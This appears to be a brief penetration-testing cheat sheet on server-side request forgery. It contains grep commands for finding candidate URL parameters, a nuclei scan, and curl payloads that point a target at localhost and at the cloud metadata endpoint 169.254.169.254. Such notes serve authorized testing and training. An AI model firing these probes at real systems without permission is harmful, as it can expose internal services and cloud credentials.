# SSRF Testing

***

### SSRF Parameter Discovery

#### Find SSRF Parameters

```sh
cat all-urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u > ssrf-urls.txt
```

#### Find API / Webhook Patterns

```sh
cat all-urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u > ssrf-api.txt
```

***

### SSRF Testing

#### Basic

```sh
curl "https://example.com/page?url=http://127.0.0.1:80/"
```

#### Nuclei SSRF Scan

```sh
cat all-urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
```

#### Cloud Metadata SSRF

```sh
curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```
